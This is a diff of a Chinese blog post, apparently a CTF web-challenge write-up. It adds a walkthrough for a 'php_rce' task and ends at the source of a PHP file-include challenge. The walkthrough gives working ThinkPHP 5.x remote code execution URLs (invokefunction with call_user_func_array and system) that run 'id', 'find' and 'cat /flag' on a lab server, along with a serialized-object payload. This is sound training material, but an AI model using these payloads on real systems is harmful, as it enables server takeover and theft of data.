@@ -277,7 +277,27 @@
 <p><code>http://111.200.241.244:50547/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
 <p>得到flag</p>
 <h2 id="7-php-rce"><a href="#7-php-rce" class="headerlink" title="7.php_rce"></a>7.php_rce</h2><h3 id="1-题目描述-17"><a href="#1-题目描述-17" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
-<h3 id="2-wp-14"><a href="#2-wp-14" class="headerlink" title="2)wp"></a>2)wp</h3><h2 id="8-Web-php-include"><a href="#8-Web-php-include" class="headerlink" title="8.Web_php_include"></a>8.Web_php_include</h2><h3 id="1-题目描述-18"><a href="#1-题目描述-18" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
+<h3 id="2-wp-14"><a href="#2-wp-14" class="headerlink" title="2)wp"></a>2)wp</h3><p>开始界面如下</p>
+<p><img src="/2022/06/21/Gongfang-wp/image-20220630174402928.png" alt="image-20220630174402928"></p>
+<p>（看到thinkphp我就想起今年国赛也有一道think PHP的题，爆0，麻了）</p>
+<p>这里可以先了解一下什么是<a href="../../../../2022/05/28/Web-study">rce</a>和该漏洞的成因</p>
+<p>如果这里版本的thinkphp存在rce的漏洞，就可以通过指令获取flag</p>
+<p>百度可知</p>
+<p><code>ThinkPHP 5.0&lt;5.0.23&amp;5.1&lt;5.1.31版本在没有开启强制路由的情况下可能存在远程代码执行漏洞。攻击者通过该漏洞可能完全控制Web服务器。</code> </p>
+<p>然后在Github上搜thinkphp得到<a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">payload</a></p>
+<p><img src="/2022/06/21/Gongfang-wp/image-20220630174951670.png" alt="image-20220630174951670"></p>
+<p>尝试<code>http://111.200.241.244:51053/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p>
+<p><img src="/2022/06/21/Gongfang-wp/Users\荒天帝\AppData\Roaming\Typora\typora-user-images\image-20220630175035541.png" alt="image-20220630175035541"></p>
+<p>了解到最后的id处为命令执行语句输入处，用 find语句查看有没有flag文件</p>
+<p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name flag*</code></p>
+<p><img src="/2022/06/21/Gongfang-wp/image-20220630175318946.png" alt="image-20220630175318946"></p>
+<p>得到的结果很乱，用F12整洁一些</p>
+<p>最后行，看到flag文件夹</p>
+<p><img src="/2022/06/21/Gongfang-wp/image-20220630175432667.png" alt="image-20220630175432667"></p>
+<p>用cat显示出来</p>
+<p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></p>
+<p>得到flag</p>
+<h2 id="8-Web-php-include"><a href="#8-Web-php-include" class="headerlink" title="8.Web_php_include"></a>8.Web_php_include</h2><h3 id="1-题目描述-18"><a href="#1-题目描述-18" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
 <h3 id="2-wp-15"><a href="#2-wp-15" class="headerlink" title="2)wp"></a>2)wp</h3><p>这道题先了解<a href="../../../../2022/05/28/Web-study">php伪协议</a></p>
 <p>看名字很清楚是到文件包含的题目</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;  <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
